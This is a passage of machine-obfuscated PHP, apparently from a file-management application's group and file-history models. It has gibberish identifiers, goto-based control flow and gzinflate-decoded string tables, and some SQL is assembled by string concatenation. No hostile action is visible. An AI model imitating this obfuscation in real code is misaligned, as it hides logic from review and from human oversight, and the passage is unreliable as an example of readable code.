} else { $D˜Ğ–œ»·à = $this->getInfoSimple($bô¯¤®‘É†[$b¨»†¥¸‡[384]]); if (!$D˜Ğ–œ»·à) { return !1; } } $EÜ—‰Ò·óÈ = $b¨»†¥¸‡[1622]; goto aƒœ¥£ø•Ê; aƒœ¥£ø•Ê: if ($D˜Ğ–œ»·à[$b¨»†¥¸‡[373]]) { $EÜ—‰Ò·óÈ = $D˜Ğ–œ»·à[$b¨»†¥¸‡[373]] . $D˜Ğ–œ»·à[$b¨»†¥¸‡[1542]] . $b¨»†¥¸‡[47]; } $b³Í‹Òš¤´ = array($b¨»†¥¸‡[387] => $this->groupNameAuto($bô¯¤®‘É†[$b¨»†¥¸‡[384]], $bô¯¤®‘É†[$b¨»†¥¸‡[28]]), $b¨»†¥¸‡[398] => $bô¯¤®‘É†[$b¨»†¥¸‡[384]], $b¨»†¥¸‡[399] => $EÜ—‰Ò·óÈ, $b¨»†¥¸‡[1623] => $bô¯¤®‘É†[$b¨»†¥¸‡[1526]], $b¨»†¥¸‡[1624] => 0, $b¨»†¥¸‡[1546] => 0); if (!empty($bô¯¤®‘É†[$b¨»†¥¸‡[1542]])) { $b³Í‹Òš¤´[$b¨»†¥¸‡[1542]] = $bô¯¤®‘É†[$b¨»†¥¸‡[1542]]; } goto aíƒÙ°ñ‘¼; Bª‰œó«ªÃ: } protected function groupEdit($dÂÌ¼¦ß ˆ, $c¨ÑßÙÊ) { $F¿‘Ûøƒ‹Ô =& $_SERVER[İåâé¾]; if (!empty($c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[384]])) { $bù¯³Ññ¹¡ = $this->getInfoSimple($dÂÌ¼¦ß ˆ); $F‰¶è™™Ñ† = $this->getInfoSimple($c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[384]]); if (!$bù¯³Ññ¹¡ || !$F‰¶è™™Ñ†) { return !1; } if ($c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[384]] != $bù¯³Ññ¹¡[$F¿‘Ûøƒ‹Ô[384]]) { if ($F‰¶è™™Ñ†[$F¿‘Ûøƒ‹Ô[373]] !== $bù¯³Ññ¹¡[$F¿‘Ûøƒ‹Ô[373]] && strpos($F‰¶è™™Ñ†[$F¿‘Ûøƒ‹Ô[373]], $bù¯³Ññ¹¡[$F¿‘Ûøƒ‹Ô[373]]) === 0) { return !1; } $c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[399]] = $F‰¶è™™Ñ†[$F¿‘Ûøƒ‹Ô[373]] . $c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[384]] . $F¿‘Ûøƒ‹Ô[47]; $this->_changeChildLevel($bù¯³Ññ¹¡, $F‰¶è™™Ñ†); } } if (isset($c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[28]])) { $this->setNamePinyin($dÂÌ¼¦ß ˆ, $c¨ÑßÙÊ[$F¿‘Ûøƒ‹Ô[28]]); } return $this->where(array($F¿‘Ûøƒ‹Ô[1625] => $dÂÌ¼¦ß ˆ))->save($c¨ÑßÙÊ); } private function _changeChildLevel($aƒàÁá¤, $d¥¶Êø°à¡, $a‚™×°Ñ = false) { goto CÀ¹±óË; bãìæä×âó: if ($a‚™×°Ñ) { $Eïªä›ä©… = $d¥¶Êø°à¡[$EŸÈÓÉâÇ°[373]] . $d¥¶Êø°à¡[$EŸÈÓÉâÇ°[1542]] . $EŸÈÓÉâÇ°[47]; } $fƒâ³’İ = array($EŸÈÓÉâÇ°[399] => array($EŸÈÓÉâÇ°[408], $aƒàÁá¤[$EŸÈÓÉâÇ°[373]] . $aƒàÁá¤[$EŸÈÓÉâÇ°[1542]] . $EŸÈÓÉâÇ°[409])); $e…Í­”Î¡» = array($EŸÈÓÉâÇ°[399] => array($EŸÈÓÉâÇ°[414], "\162\x65\x70\154\141\143\145\x28\x70\141\162\145\156\x74\x4c\145\166\x65\154\54\x27{$Eº³öªÓ““}\47\54\x27{$Eïªä›ä©…}\x27\51")); goto C‡®‡°ƒ”Š; C‡®‡°ƒ”Š: $this->where($fƒâ³’İ)->data($e…Í­”Î¡»)->save(); goto A­ò‘‚Ï; CÀ¹±óË: $EŸÈÓÉâÇ° =& $_SERVER[İåâé¾]; $Eº³öªÓ““ = $aƒàÁá¤[$EŸÈÓÉâÇ°[373]] . $aƒàÁá¤[$EŸÈÓÉâÇ°[1542]] . $EŸÈÓÉâÇ°[47]; $Eïªä›ä©… = $d¥¶Êø°à¡[$EŸÈÓÉâÇ°[373]] . $d¥¶Êø°à¡[$EŸÈÓÉâÇ°[1542]] . $EŸÈÓÉâÇ°[47] . $aƒàÁá¤[$EŸÈÓÉâÇ°[1542]] . $EŸÈÓÉâÇ°[47]; goto bãìæä×âó; A­ò‘‚Ï: } public function setNamePinyin($F¿Ö‡¼İ»Ù, $e¦ÁÇĞ§å = false) { $f×’Ù’î¼È =& $_SERVER[İåâé¾]; if (!$e¦ÁÇĞ§å) { $Bİœ‹Å·ÉÅ = $this->getInfoSimple($F¿Ö‡¼İ»Ù); $e¦ÁÇĞ§å = $Bİœ‹Å·ÉÅ[$f×’Ù’î¼È[28]]; } if (!Input::check($e¦ÁÇĞ§å, $f×’Ù’î¼È[403])) { $this->metaSet($F¿Ö‡¼İ»Ù, $f×’Ù’î¼È[404], null); $this->metaSet($F¿Ö‡¼İ»Ù, $f×’Ù’î¼È[405], null); return; } $BŞÀ¤¼„Ëİ = array($f×’Ù’î¼È[404] => str_replace($f×’Ù’î¼È[50], $f×’Ù’î¼È[33], Pinyin::encode($e¦ÁÇĞ§å)), $f×’Ù’î¼È[405] => Pinyin::encode($e¦ÁÇĞ§å, $f×’Ù’î¼È[406])); $this->metaSet($F¿Ö‡¼İ»Ù, $BŞÀ¤¼„Ëİ); } protected function groupRemove($cî˜…Õˆéğ) { goto B©ŠÅï¡Ş; c‚õ§ÔéŒ„: $this->where(array($b„¯¹ÃÀç[384] => $cî˜…Õˆéğ))->save(array($b„¯¹ÃÀç[384] => $AìÄŠæÙå£[$b„¯¹ÃÀç[384]])); Model($b„¯¹ÃÀç[1626])->where($eã¢Ï“œÇŞ)->delete(); Model($b„¯¹ÃÀç[1627])->where($eã¢Ï“œÇŞ)->delete(); goto AÚ†æƒİÚš; B©ŠÅï¡Ş: $b„¯¹ÃÀç =& $_SERVER[İåâé¾]; $eã¢Ï“œÇŞ = array($b„¯¹ÃÀç[1542] => $cî˜…Õˆéğ); $AìÄŠæÙå£ = $this->where($eã¢Ï“œÇŞ)->find(); goto cÃèÌ‚©„¨; cÃèÌ‚©„¨: if (!$AìÄŠæÙå£ || $AìÄŠæÙå£[$b„¯¹ÃÀç[384]] == 0) { return !1; } $D´®ŸÚ½Şµ = $this->getInfoSimple($AìÄŠæÙå£[$b„¯¹ÃÀç[384]]); $this->_changeChildLevel($AìÄŠæÙå£, $D´®ŸÚ½Şµ, !0); goto c‚õ§ÔéŒ„; AÚ†æƒİÚš: Model($b„¯¹ÃÀç[521])->groupRootRemove($cî˜…Õˆéğ); return $this->where($eã¢Ï“œÇŞ)->delete(); goto CóáÀÓâ’ï; CóáÀÓâ’ï: } public function listData() { $Fí†ä¤¬ª÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Fí†ä¤¬ª÷[$_SERVER[İåâé¾][356]]); return $Fí†ä¤¬ª÷; } private function _makeOrder($B£‰à‡õ¸¨ = '') { goto AÕÆ§óƒÒ; AÕÆ§óƒÒ: $C‡ñ¿é£é =& $_SERVER[İåâé¾]; $cºôœ¤ = array($C‡ñ¿é£é[1542], $C‡ñ¿é£é[28], $C‡ñ¿é£é[1528], $C‡ñ¿é£é[186]); $Aªê¥±ƒÚ = array($C‡ñ¿é£é[1628] => $C‡ñ¿é£é[1629], $C‡ñ¿é£é[1509] => $C‡ñ¿é£é[1586]); goto CÜœƒÓàˆò; CÜœƒÓàˆò: $DŒì£Ş£ºø = Input::get($C‡ñ¿é£é[1582], $C‡ñ¿é£é[7], $C‡ñ¿é£é[1625], $cºôœ¤); $dˆôùîğËº = Input::get($C‡ñ¿é£é[1584], $C‡ñ¿é£é[7], $C‡ñ¿é£é[1630], array($C‡ñ¿é£é[1630], $C‡ñ¿é£é[1509])); $dˆôùîğËº = $Aªê¥±ƒÚ[$dˆôùîğËº]; goto dæ¯“‡¶Êğ; dæ¯“‡¶Êğ: $B£‰à‡õ¸¨ = $B£‰à‡õ¸¨ . "{$DŒì£Ş£ºø}\40{$dˆôùîğËº}\x2c\x20\x67\x72\157\165\160\111\x44\x20\x61\x73\x63"; return $this->order($B£‰à‡õ¸¨); goto câàÛšÊŒ’; câàÛšÊŒ’: } public function listChild($fƒ®ù³ĞÊÕ) { $BªÃ‚¸‹…® =& $_SERVER[İåâé¾]; $dÚ¹ñêìßº = $this->where(array($BªÃ‚¸‹…®[384] => $fƒ®ù³ĞÊÕ))->_makeOrder()->selectPage(200); $this->_listDataApply($dÚ¹ñêìßº[$BªÃ‚¸‹…®[356]]); return $dÚ¹ñêìßº; } public function listByID($E‚í†ÒŠ†ˆ) { $bÜš›£éí =& $_SERVER[İåâé¾]; if (!$E‚í†ÒŠ†ˆ) { return array(); } $Fê²­«Û§é = array($bÜš›£éí[1542] => array($bÜš›£éí[7], $E‚í†ÒŠ†ˆ)); $DóÀê‘ä„¸ = $this->where($Fê²­«Û§é)->select(); $this->_listDataApply($DóÀê‘ä„¸); return $DóÀê‘ä„¸; } public function listSearch($EÂÓ¢­´•) { goto eÛÈ…òöˆ; b½“Ä‡ñò§: if (!trim($aÃÎİï®ä”)) { return !1; } $aÃÎİï®ä” = str_replace($dÈ””ÁŒÍ[1633], $dÈ””ÁŒÍ[1634], $aÃÎİï®ä”); $aºëá»ÇÍğ = array($dÈ””ÁŒÍ[1542] => array($dÈ””ÁŒÍ[520], "\x25{$aÃÎİï®ä”}\45"), $dÈ””ÁŒÍ[28] => array($dÈ””ÁŒÍ[520], "\45{$aÃÎİï®ä”}\x25"), $dÈ””ÁŒÍ[680] => $dÈ””ÁŒÍ[1635]); goto Dõ­¦³é˜¢; eÛÈ…òöˆ: $dÈ””ÁŒÍ =& $_SERVER[İåâé¾]; $aÃÎİï®ä” = $EÂÓ¢­´•[$dÈ””ÁŒÍ[1631]]; $B¸¦ÏÆƒÒò = isset($EÂÓ¢­´•[$dÈ””ÁŒÍ[1632]]) ? $EÂÓ¢­´•[$dÈ””ÁŒÍ[1632]] : !1; goto b½“Ä‡ñò§; Dõ­¦³é˜¢: $cä‚£÷¦ù– = $this->_makeOrder()->where($aºëá»ÇÍğ)->selectPage(20); $cä‚£÷¦ù– = $cä‚£÷¦ù– ? $cä‚£÷¦ù– : array(); if (!$cä‚£÷¦ù– || count($cä‚£÷¦ù–[$dÈ””ÁŒÍ[356]]) < 5 && Input::check($aÃÎİï®ä”, $dÈ””ÁŒÍ[309])) { $A‡³÷õó•Ì = $this->_searchFromMeta($dÈ””ÁŒÍ[405], $aÃÎİï®ä”, 10); $CáçöÃÛÏ = $this->_searchFromMeta($dÈ””ÁŒÍ[404], $aÃÎİï®ä”, 10); $e’²™¯â = array_merge($A‡³÷õó•Ì, $CáçöÃÛÏ, $cä‚£÷¦ù–[$dÈ””ÁŒÍ[356]]); $cä‚£÷¦ù–[$dÈ””ÁŒÍ[356]] = array_unique_by_key($e’²™¯â, $dÈ””ÁŒÍ[1542]); $cä‚£÷¦ù–[$dÈ””ÁŒÍ[353]][$dÈ””ÁŒÍ[354]] = count($cä‚£÷¦ù–[$dÈ””ÁŒÍ[356]]); $cä‚£÷¦ù–[$dÈ””ÁŒÍ[353]][$dÈ””ÁŒÍ[355]] = ceil($cä‚£÷¦ù–[$dÈ””ÁŒÍ[353]][$dÈ””ÁŒÍ[354]] / $cä‚£÷¦ù–[$dÈ””ÁŒÍ[353]][$dÈ””ÁŒÍ[351]]); } goto dËÍÖÕô…; dËÍÖÕô…: $this->_listDataApply($cä‚£÷¦ù–[$dÈ””ÁŒÍ[356]]); return $cä‚£÷¦ù–; goto Fê±»Ã¬šù; Fê±»Ã¬šù: } private function _searchFromMeta($dÔâÙé×, $FÙĞ´‰§™„, $d…Ú§ß‘Ş) { goto dä›©®Á›ó; AÍøãèèì: $Eº¼Š ÉÅÖ = $this->where(array($DÌÔèĞ£´Ã[1625] => array($DÌÔèĞ£´Ã[7], $E°‰Ê¿¯œ)))->select(); if (!$Eº¼Š ÉÅÖ) { return array(); } return $Eº¼Š ÉÅÖ; goto C¥Æ©Ş• ; dä›©®Á›ó: $DÌÔèĞ£´Ã =& $_SERVER[İåâé¾]; $FÙĞ´‰§™„ = strtolower($FÙĞ´‰§™„); $bªí¨´àĞ® = array($DÌÔèĞ£´Ã[88] => $dÔâÙé×, $DÌÔèĞ£´Ã[359] => array($DÌÔèĞ£´Ã[520], "\x25{$FÙĞ´‰§™„}\x25")); goto BÉÀÆšŠÉà; BÉÀÆšŠÉà: $E°‰Ê¿¯œ = Model($DÌÔèĞ£´Ã[1636])->where($bªí¨´àĞ®)->limit($d…Ú§ß‘Ş)->select(); if (!$E°‰Ê¿¯œ) { return array(); } $E°‰Ê¿¯œ = array_to_keyvalue($E°‰Ê¿¯œ, $DÌÔèĞ£´Ã[33], $DÌÔèĞ£´Ã[1542]); goto AÍøãèèì; C¥Æ©Ş• : } protected function _listDataApplyItem($b†«ÙÏİÁ¾) { $fÈŒ×¹ÔŞ² = array($b†«ÙÏİÁ¾); $this->_listDataApply($fÈŒ×¹ÔŞ²); return $fÈŒ×¹ÔŞ²[0]; } protected function _listDataApply(&$AÖê¼¹ÚÇó) { goto dÈëé‚ˆ…; dÈëé‚ˆ…: $E™ØÄ™Õª =& $_SERVER[İåâé¾]; if (!$AÖê¼¹ÚÇó) { return; } $BôÒÚ‡‰·ø = array_to_keyvalue($AÖê¼¹ÚÇó, $E™ØÄ™Õª[33], $E™ØÄ™Õª[1542]); goto FÖøï›òù¦; DÔ³…‹‚Ç: $this->_listAppendParent($AÖê¼¹ÚÇó); $this->_listAppendSourceRoot($AÖê¼¹ÚÇó, $BôÒÚ‡‰·ø); goto BŠÏä»”°§; FÖøï›òù¦: $this->_listAppendChildren($AÖê¼¹ÚÇó); $this->_listAppendChildrenMember($AÖê¼¹ÚÇó); $this->_listAppendMeta($AÖê¼¹ÚÇó, $BôÒÚ‡‰·ø); goto DÔ³…‹‚Ç; BŠÏä»”°§: } private function _listAppendChildren(&$f¨Ş·“Ğ‘Æ) { goto D•é£ˆô¬®; D¾áÂø¡: $FÊÒ’– å = array_to_keyvalue($FÊÒ’– å, $DåÍÙÙå”ñ[1638]); foreach ($f¨Ş·“Ğ‘Æ as &$aø—²Ğ¤–Î) { $aø—²Ğ¤–Î[$DåÍÙÙå”ñ[1639]] = isset($FÊÒ’– å[$aø—²Ğ¤–Î[$DåÍÙÙå”ñ[1542]] . $DåÍÙÙå”ñ[1640]]); } goto Bá¡àœîø“; DŒÎµ•‰: $Cñµå¥ğñã = count($f¨Ş·“Ğ‘Æ); $EÌ‡Ø…Î¢Ò = $this->tablePrefix . $this->tableName; for ($CËß§á‘ğÔ = 0, $E÷­¾¸à” = 0; $CËß§á‘ğÔ < $Cñµå¥ğñã; $CËß§á‘ğÔ++) { $E÷­¾¸à”++; $côãÀ•·¼Ø = $f¨Ş·“Ğ‘Æ[$CËß§á‘ğÔ][$DåÍÙÙå”ñ[1542]]; $Eñ¥óËš¶» .= "\123\105\x4c\105\x43\124\40\52\40\x46\122\117\x4d\40\x28\123\x45\114\x45\x43\x54\40\x27{$côãÀ•·¼Ø}\x5f\143\150\x69\154\x64\x27\40\141\x73\40\150\141\x73\x20\x46\x52\117\115\40\140{$EÌ‡Ø…Î¢Ò}\x60\40\x77\x68\x65\162\x65\40\160\141\x72\x65\x6e\164\111\x44\75{$côãÀ•·¼Ø}\40\154\x69\155\x69\x74\x20\x31\51\x20\141\163\x20\164\x62\137{$côãÀ•·¼Ø}\x20\165\156\151\x6f\x6e\x20\x61\x6c\154\x20"; if (($E÷­¾¸à” >= 20 || $CËß§á‘ğÔ == $Cñµå¥ğñã - 1) && $Eñ¥óËš¶») { $Eñ¥óËš¶» = substr($Eñ¥óËš¶», 0, -strlen($DåÍÙÙå”ñ[1637])); $cç¯º·Ÿ„ = $this->query($Eñ¥óËš¶»); $FÊÒ’– å = array_merge($FÊÒ’– å, $cç¯º·Ÿ„); $E÷­¾¸à” = 0; $Eñ¥óËš¶» = $DåÍÙÙå”ñ[33]; } } goto D¾áÂø¡; D•é£ˆô¬®: $DåÍÙÙå”ñ =& $_SERVER[İåâé¾]; $Eñ¥óËš¶» = $DåÍÙÙå”ñ[363]; $FÊÒ’– å = array(); goto DŒÎµ•‰; Bá¡àœîø“: } private function _listAppendChildrenMember(&$aÑÏÂ…œš) { goto Dï›Î­¤•; B¯¨ëµª†¨: $AĞŠñ¸©ùé = array_to_keyvalue($AĞŠñ¸©ùé, $a£¾Ô²®¬ç[1638]); foreach ($aÑÏÂ…œš as &$DÀ„å¦ƒèÜ) { $DÀ„å¦ƒèÜ[$a£¾Ô²®¬ç[1641]] = isset($AĞŠñ¸©ùé[$DÀ„å¦ƒèÜ[$a£¾Ô²®¬ç[1542]] . $a£¾Ô²®¬ç[1640]]); } goto BãÈ”çÏ; Dï›Î­¤•: $a£¾Ô²®¬ç =& $_SERVER[İåâé¾]; $Cˆøç…©Š» = $a£¾Ô²®¬ç[363]; $AĞŠñ¸©ùé = array(); goto D±Şö¼Ş›ï; D±Şö¼Ş›ï: $bŸºÇ‰”¾› = count($aÑÏÂ…œš); $B„¤‹îŠŒì = $this->tablePrefix . $a£¾Ô²®¬ç[1627]; for ($C‘‘¿©åÖ— = 0, $Aè¹±‹ºÕÏ = 0; $C‘‘¿©åÖ— < $bŸºÇ‰”¾›; $C‘‘¿©åÖ—++) { $Aè¹±‹ºÕÏ++; $aò²ãÀÙ¶ë = $aÑÏÂ…œš[$C‘‘¿©åÖ—][$a£¾Ô²®¬ç[1542]]; $Cˆøç…©Š» .= "\123\105\x4c\105\103\x54\40\x2a\40\x46\122\117\115\40\50\123\x45\114\x45\x43\x54\40\x27{$aò²ãÀÙ¶ë}\137\x63\150\151\154\x64\47\40\x61\163\x20\x68\141\x73\x20\106\122\x4f\115\x20\140{$B„¤‹îŠŒì}\140\40\167\150\x65\162\x65\40\x67\162\x6f\x75\x70\111\104\75{$aò²ãÀÙ¶ë}\40\x6c\x69\x6d\151\164\40\x31\51\40\141\163\40\x74\142\137{$aò²ãÀÙ¶ë}\x20\165\156\151\x6f\156\x20\x61\154\154\x20"; if (($Aè¹±‹ºÕÏ >= 20 || $C‘‘¿©åÖ— == $bŸºÇ‰”¾› - 1) && $Cˆøç…©Š») { $Cˆøç…©Š» = substr($Cˆøç…©Š», 0, -strlen($a£¾Ô²®¬ç[1637])); $FöÚæÎŒŒ = $this->query($Cˆøç…©Š»); $AĞŠñ¸©ùé = array_merge($AĞŠñ¸©ùé, $FöÚæÎŒŒ); $Aè¹±‹ºÕÏ = 0; $Cˆøç…©Š» = $a£¾Ô²®¬ç[33]; } } goto B¯¨ëµª†¨; BãÈ”çÏ: } private function _listAppendMeta(&$aùêÜ˜îª¦, $eí½‹Ä£»ƒ) { $dª²¶…„† =& $_SERVER[İåâé¾]; $B»ºÖÓÃÀ½ = array($dª²¶…„†[1542] => array($dª²¶…„†[7], $eí½‹Ä£»ƒ)); $D®Š‚ÁìŠÒ = Model($dª²¶…„†[1626])->where($B»ºÖÓÃÀ½)->select(); $D®Š‚ÁìŠÒ = array_to_keyvalue_group($D®Š‚ÁìŠÒ, $dª²¶…„†[1542]); foreach ($D®Š‚ÁìŠÒ as &$C½îá¸¨¤‚) { $C½îá¸¨¤‚ = array_to_keyvalue($C½îá¸¨¤‚, $dª²¶…„†[88], $dª²¶…„†[359]); } foreach ($aùêÜ˜îª¦ as &$e •ß¿îƒÈ) { $e •ß¿îƒÈ[$dª²¶…„†[1588]] = array(); if (isset($D®Š‚ÁìŠÒ[$e •ß¿îƒÈ[$dª²¶…„†[1542]]])) { $e •ß¿îƒÈ[$dª²¶…„†[1588]] = $D®Š‚ÁìŠÒ[$e •ß¿îƒÈ[$dª²¶…„†[1542]]]; } } } protected function parentLevelArray($F ŒŠ¼„ŸŞ) { $bÁ‚½×«ìœ =& $_SERVER[İåâé¾]; $F ŒŠ¼„ŸŞ = explode($bÁ‚½×«ìœ[47], trim($F ŒŠ¼„ŸŞ, $bÁ‚½×«ìœ[47])); $F ŒŠ¼„ŸŞ = array_remove_value($F ŒŠ¼„ŸŞ, $bÁ‚½×«ìœ[402]); return $F ŒŠ¼„ŸŞ; } private function _listAppendParent(&$d”½‹ÖÀ‚ê) { goto Cì«‘”ƒ„; CÂµ¾×å’: $b…ß¦®éø‚ = array(); foreach ($Bï„‚±ŒÕØ as $c™ÎâĞÄàÅ => $cŒÌÇäÊÙë) { if (!$cŒÌÇäÊÙë) { $b…ß¦®éø‚[] = $c™ÎâĞÄàÅ; } } if ($b…ß¦®éø‚) { $Eõ—ÍÚŒÂ = array($FùÀºò¥‰î[1625] => array($FùÀºò¥‰î[1642], $b…ß¦®éø‚)); $dß½É­Ú¾‹ = $this->field($FùÀºò¥‰î[1643])->where($Eõ—ÍÚŒÂ)->select(); $fåÛ¶ôÒë¼ = array_to_keyvalue($dß½É­Ú¾‹, $FùÀºò¥‰î[1542], $FùÀºò¥‰î[28]); $Bï„‚±ŒÕØ = array_merge_index($Bï„‚±ŒÕØ, $fåÛ¶ôÒë¼); } goto Dº»ÓøÁ½˜; Cì«‘”ƒ„: $FùÀºò¥‰î =& $_SERVER[İåâé¾]; $Bï„‚±ŒÕØ = array(); foreach ($d”½‹ÖÀ‚ê as &$aÔ„°«Ş½Ë) { $Bï„‚±ŒÕØ[$aÔ„°«Ş½Ë[$FùÀºò¥‰î[1542]]] = $aÔ„°«Ş½Ë[$FùÀºò¥‰î[28]]; $eªß«©÷Û = $this->parentLevelArray($aÔ„°«Ş½Ë[$FùÀºò¥‰î[373]]); foreach ($eªß«©÷Û as $C»˜¶ˆ»¯Ì) { if (!isset($Bï„‚±ŒÕØ[$C»˜¶ˆ»¯Ì])) { $Bï„‚±ŒÕØ[$C»˜¶ˆ»¯Ì] = 0; } } } goto CÂµ¾×å’; Dº»ÓøÁ½˜: foreach ($d”½‹ÖÀ‚ê as &$aÔ„°«Ş½Ë) { $eªß«©÷Û = $this->parentLevelArray($aÔ„°«Ş½Ë[$FùÀºò¥‰î[373]]); $Dçåƒ’ŒÛ = $FùÀºò¥‰î[33]; foreach ($eªß«©÷Û as $C»˜¶ˆ»¯Ì) { $Dçåƒ’ŒÛ .= $Bï„‚±ŒÕØ[$C»˜¶ˆ»¯Ì] . $FùÀºò¥‰î[8]; } if ($eªß«©÷Û) { $Dçåƒ’ŒÛ .= $aÔ„°«Ş½Ë[$FùÀºò¥‰î[28]]; } $aÔ„°«Ş½Ë[$FùÀºò¥‰î[1644]] = str_replace($FùÀºò¥‰î[1322], $FùÀºò¥‰î[8], $Dçåƒ’ŒÛ); } goto AÕÁÒ™¾ÕÖ; AÕÁÒ™¾ÕÖ: } private function _listAppendSourceRoot(&$EôÎ¹¥ØŸà, $eÃíËï¥¤) { $bŒŒË‚áÅ =& $_SERVER[İåâé¾]; $B©Ú™İ‹Š = array($bŒŒË‚áÅ[393] => SourceModel::TYPE_GROUP, $bŒŒË‚áÅ[384] => 0, $bŒŒË‚áÅ[395] => array($bŒŒË‚áÅ[7], $eÃíËï¥¤)); $fïÁÂù È = Model($bŒŒË‚áÅ[521])->field($bŒŒË‚áÅ[1645])->where($B©Ú™İ‹Š)->select(); $fïÁÂù È = array_to_keyvalue($fïÁÂù È, $bŒŒË‚áÅ[395]); $fïÁÂù È = array_remove_key($fïÁÂù È, $bŒŒË‚áÅ[395]); foreach ($EôÎ¹¥ØŸà as &$f‰”«‰³¶Û) { $f‰”«‰³¶Û[$bŒŒË‚áÅ[856]] = $fïÁÂù È[$f‰”«‰³¶Û[$bŒŒË‚áÅ[1542]]] ? $fïÁÂù È[$f‰”«‰³¶Û[$bŒŒË‚áÅ[1542]]] : array(); } } protected function resetParentLevel() { $EŞŠ¿÷©ªÙ =& $_SERVER[İåâé¾]; $b¤ŠËª¿« = $EŞŠ¿÷©ªÙ[1542]; $Fõ¶¾ ÃäÓ = $this->select(); $Fõ¶¾ ÃäÓ = array_to_keyvalue($Fõ¶¾ ÃäÓ, $b¤ŠËª¿«); foreach ($Fõ¶¾ ÃäÓ as $FåĞœ—ì•) { goto A°Š·ÊºÒ½; A°Š·ÊºÒ½: $A˜†õ”‚âØ = $FåĞœ—ì•; $cÀŸ­·ˆ¤ = array(); while ($A˜†õ”‚âØ[$EŞŠ¿÷©ªÙ[384]] != 0) { $cÀŸ­·ˆ¤[] = $A˜†õ”‚âØ[$EŞŠ¿÷©ªÙ[384]]; $A˜†õ”‚âØ = $Fõ¶¾ ÃäÓ[$A˜†õ”‚âØ[$EŞŠ¿÷©ªÙ[384]]]; } goto aÇ’ñíõâ¦; bÌê´¡¬ˆ: $this->where(array($b¤ŠËª¿« => $FåĞœ—ì•[$b¤ŠËª¿«]))->save(array($EŞŠ¿÷©ªÙ[399] => $cÀŸ­·ˆ¤)); goto c„à‰¢„ê£; aÇ’ñíõâ¦: $cÀŸ­·ˆ¤[] = 0; $cÀŸ­·ˆ¤ = $EŞŠ¿÷©ªÙ[47] . implode($EŞŠ¿÷©ªÙ[47], array_reverse($cÀŸ­·ˆ¤)) . $EŞŠ¿÷©ªÙ[47]; $this->setNamePinyin($FåĞœ—ì•[$b¤ŠËª¿«], $FåĞœ—ì•[$EŞŠ¿÷©ªÙ[28]]); goto bÌê´¡¬ˆ; c„à‰¢„ê£: } return $Fõ¶¾ ÃäÓ; } public function groupNameAuto($Dò…Ã¿¯, $EåÆˆœ²) { $Cô‰ã’¦á© =& $_SERVER[İåâé¾]; $dÃò„‹ÏÚ = $this->where(array($Cô‰ã’¦á©[398] => $Dò…Ã¿¯))->getField($Cô‰ã’¦á©[28], !0); if (!$dÃò„‹ÏÚ || !in_array($EåÆˆœ², $dÃò„‹ÏÚ)) { return $EåÆˆœ²; } for ($aÄÕœöïÇì = 1; $aÄÕœöïÇì <= count($dÃò„‹ÏÚ) + 1; $aÄÕœöïÇì++) { $aÚ…•—ô†  = $EåÆˆœ² . "\x28{$aÄÕœöïÇì}\51"; if (!in_array($aÚ…•—ô† , $dÃò„‹ÏÚ)) { return $aÚ…•—ô† ; } } } } define($_SERVER[İåâé¾][1646], $_SERVER[İåâé¾][1647]); goto E¶ÃäØÛêÔ; D‘âÈˆ‘¿Ø: define($_SERVER[İåâé¾][1734], $_SERVER[İåâé¾][1735]); $_SERVER[¶Ù˜] = explode($_SERVER[İåâé¾][1736], gzinflate(substr($_SERVER[İåâé¾][1737], 10, -8))); class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\x63\145\137\x68\x69\163\x74\157\162\171"; public function addHistory($d—ÉÌÌ É», $a²œèô×¦¾ = '') { $bŸ•í†à =& $_SERVER[¶Ù˜]; $Fà·¦…‹„ = array($bŸ•í†à[0] => $d—ÉÌÌ É»[$bŸ•í†à[1]], $bŸ•í†à[2] => isset($d—ÉÌÌ É»[$bŸ•í†à[3]]) ? $d—ÉÌÌ É»[$bŸ•í†à[3]] : $d—ÉÌÌ É»[$bŸ•í†à[4]], $bŸ•í†à[5] => $d—ÉÌÌ É»[$bŸ•í†à[6]], $bŸ•í†à[7] => $d—ÉÌÌ É»[$bŸ•í†à[8]], $bŸ•í†à[9] => $a²œèô×¦¾); $this->historyAutoClear($Fà·¦…‹„[$bŸ•í†à[1]]); $this->add($Fà·¦…‹„); Model($bŸ•í†à[10])->eventFileEdit($d—ÉÌÌ É»[$bŸ•í†à[1]]); } private function historyAutoClear($FÃÙ¿à®­š) { goto D»¹Ğ¡‚³õ; A¸æ¾‰ÔÄ†: $e‹ÏÆË±Ğ± = array_slice($e‹ÏÆË±Ğ±, $D‘¾îĞ—º¥); $eÉÊÂ‚é· = array_to_keyvalue($aŒ¾í»•õ…, $dã¹ªÏçÆ·[19], $dã¹ªÏçÆ·[6]); $eÉÊÂ‚é· = array_slice($eÉÊÂ‚é·, $D‘¾îĞ—º¥); goto AİÏºğ·¥ğ; A±ŸæÊò: $aŒ¾í»•õ… = $this->field($dã¹ªÏçÆ·[17])->where($cÎ ©ê¼œ¥)->order($dã¹ªÏçÆ·[18])->select(); if (!$aŒ¾í»•õ… || $D‘¾îĞ—º¥ >= count($aŒ¾í»•õ…)) { return; } $e‹ÏÆË±Ğ± = array_to_keyvalue($aŒ¾í»•õ…, $dã¹ªÏçÆ·[19], $dã¹ªÏçÆ·[20]); goto A¸æ¾‰ÔÄ†; D»¹Ğ¡‚³õ: $dã¹ªÏçÆ· =& $_SERVER[¶Ù˜]; $dëÎõœºƒø = Model($dã¹ªÏçÆ·[11])->get($dã¹ªÏçÆ·[12]); $f®•¤‘ƒåß = $dëÎõœºƒø == $dã¹ªÏçÆ·[13] ? 3 : $GLOBALS[$dã¹ªÏçÆ·[14]][$dã¹ªÏçÆ·[15]][$dã¹ªÏçÆ·[16]]; goto DØÂ×ãèÜĞ; DØÂ×ãèÜĞ: $D‘¾îĞ—º¥ = $f®•¤‘ƒåß - 1; if ($D‘¾îĞ—º¥ >= 500) { return; } $cÎ ©ê¼œ¥ = array($dã¹ªÏçÆ·[0] => $FÃÙ¿à®­š); goto A±ŸæÊò; AİÏºğ·¥ğ: $cÎ ©ê¼œ¥ = array($dã¹ªÏçÆ·[21] => array($dã¹ªÏçÆ·[22], $e‹ÏÆË±Ğ±)); $this->where($cÎ ©ê¼œ¥)->delete(); 